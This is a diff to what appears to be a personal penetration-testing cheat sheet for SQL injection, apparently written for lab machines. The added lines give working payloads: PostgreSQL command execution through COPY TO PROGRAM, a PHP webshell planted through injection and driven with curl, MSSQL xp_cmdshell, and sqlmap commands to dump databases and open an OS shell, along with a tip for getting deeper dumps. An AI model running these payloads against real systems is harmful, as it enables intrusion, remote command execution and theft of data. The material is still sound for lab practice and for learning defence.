@@ -57,4 +57,17 @@ admin'#
 #   run   : curl 'http://target/s.php?0=id'   /   ?0=cat%20/proof.txt
 #   needs : FILE priv + empty @@secure_file_priv + known webroot (leaked in errors)
 '; EXEC xp_cmdshell 'whoami'-- -                                              # MSSQL (enable first)
-'; COPY (SELECT '') TO PROGRAM 'id';-- -                                      # PostgreSQL
+'; COPY (SELECT '') TO PROGRAM 'id';-- -                                      # PostgreSQL run cmd
+# PostgreSQL: write a webshell to a web-served dir (/var/tmp, /backups, webroot), then browse to it:
+1';copy (select '<?php passthru($_GET[0]);?>') to '/var/tmp/cmd.php'; -- -
+#   run: curl 'http://target/backups/cmd.php?0=cat%20proof.txt'   (find which dir is web-served)
+
+## sqlmap — when manual stalls (save the Burp request first: right-click > Copy to file)
+sqlmap -r req.txt --batch --dbms=mysql                          # confirm + fingerprint from a saved request
+sqlmap -r req.txt --batch -p param --technique=BT               # force boolean/time if auto picks nothing
+sqlmap -r req.txt --batch --dbs                                 # then --tables -D db / --dump -D db -T users
+sqlmap -r req.txt --batch --os-shell                            # interactive OS shell (MySQL FILE / MSSQL xp_cmdshell / PG)
+sqlmap -r req.txt --batch --dbms=mssql --os-shell               # MSSQL direct-to-shell (asio/solarmedical style)
+# *** custom injection marker: if sqlmap only dumps DB NAMES and nothing deeper, it guessed the wrong
+#     spot. Put a literal * where the injection goes (e.g. patientName=*) in req.txt and re-run — sqlmap
+#     injects AT the * instead of appending. This is the fix for "found SQLi but can't dump tables".
